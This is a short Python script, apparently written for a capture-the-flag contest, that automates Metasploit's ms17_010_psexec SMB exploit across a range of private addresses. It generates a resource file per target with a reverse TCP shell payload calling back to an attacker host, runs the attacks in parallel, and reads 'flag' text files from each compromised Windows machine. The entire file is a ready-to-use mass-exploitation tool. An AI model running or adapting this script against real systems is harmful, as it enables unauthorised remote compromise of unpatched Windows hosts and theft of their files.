import sys
import pexpect
from time import sleep
from multiprocessing import Pool

rcf = '/tmp/rcf'
LHOST = '192.168.113.103'


def fun(ids):
    child = pexpect.spawn("msfconsole -r %s/%s.rc"%(rcf,ids))
    sleep(18)
    if 1 != child.expect(['DSJfkljsdflksad','Microsoft Windows',pexpect.EOF,pexpect.TIMEOUT],timeout=3.5):
        child.close()
        return 0

    child.sendline(r'type c:\\flag*.txt')
    sleep(1.5)
    ret = child.read_nonblocking(size=9999999)
    print("192.168.113.%s\t%s"%(ids,ret.splitlines()[-5]))
    child.close()

def makeRc(k,l):
    import os
    if not os.path.exists(rcf):
        print('Create resource directory')
        os.mkdir(rcf)

    for i in range(k,l):
        fname = "%s/%s.rc"%(rcf,i)
        with open(fname,"wb+") as f:
            f.write('use exploit/windows/smb/ms17_010_psexec\n')
            f.write('set RHOST 192.168.113.%s\n'%i)
            f.write('set payload windows/shell/reverse_tcp\n')
            f.write('set LHOST %s\n'%LHOST)
            f.write('set LPORT %s\n'%(4000+i))
            f.write('exploit\n')

def multiCore():
    makeRc(60,71)
    idList = [i for i in range(60,71)]    # ip range
    pool = Pool(6)
    pool.map(fun,idList)
    pool.close()
    pool.join()

multiCore()
